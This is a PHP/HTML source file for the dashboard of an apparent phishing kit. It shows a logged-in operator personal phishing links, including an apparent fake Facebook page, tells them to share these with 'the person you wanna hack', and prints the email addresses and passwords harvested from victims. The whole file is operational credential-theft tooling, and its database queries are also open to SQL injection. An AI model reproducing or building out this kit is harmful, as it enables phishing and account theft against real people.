<?php 
	include 'config.php';


if(isset($_SESSION['username'])){
	$userLoggedIn = $_SESSION['username'];
	$user_details_query = mysqli_query($con, "SELECT * FROM user WHERE username='$userLoggedIn'");
	$user = mysqli_fetch_array($user_details_query);
}

else{
	header("Location: index.php");
}
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<style>
@font-face {
  font-family: HACKED;
  src: url(HACKED.ttf);
}
</style>
<title>H4CK3D</title>
<style>
	
	@font-face {
  font-family: HACKED;
  src: url(HACKED.ttf);
}
*{
  font-family: HACKED;
}
body{
  background-color: black;
  color:green;
}
</style>
</head>
<body>
	 <h2 style=" font-family: 'HACKED'; font-size: 100px; text-align: center;">H4CK4D</h2>
	 <br>
	<div style="text-align: center;">
 <h1> YOU HAVE LOGINED IN TO YOU ACCOUNT: <?php echo $userLoggedIn; ?> AND HERE ARE YOUR DATAS.</h1>
<br><br>
 <h2>YOUR WEBSITE:</h2>
 	<H3>https://Domain.com/web.php?u=<?php echo $userLoggedIn; ?></H3><br>
 	<h4>SHARE THIS TO THE PERSON YOU WANNA HACK.</h4>
 	<h2>Fb Link</h2>
 	<H3>https://domain.com/fb.php?u=<?php echo $userLoggedIn; ?></H3><br>
 <h2>HACKED ACCOUNTS:</h2><br><br>
 <?php 
 $sql = "SELECT * FROM hacked_accounts WHERE hacked_by='$userLoggedIn'";
$result = $con->query($sql);
if ($result->num_rows > 0) {
    // output data of each row
    while($row = $result->fetch_assoc()) {
    	$id = $row['id'];
    	$email = $row['email'];
    	$password = $row['password'];
        echo "NO: " . $id ."    EMAIL: ". $email . "     PASSWORD: " . $password ."<br>";
    }
} else {
    echo "NO HACKED ACCOUNTS FOUND";
}

  ?>
  </div>
</body>
</html>
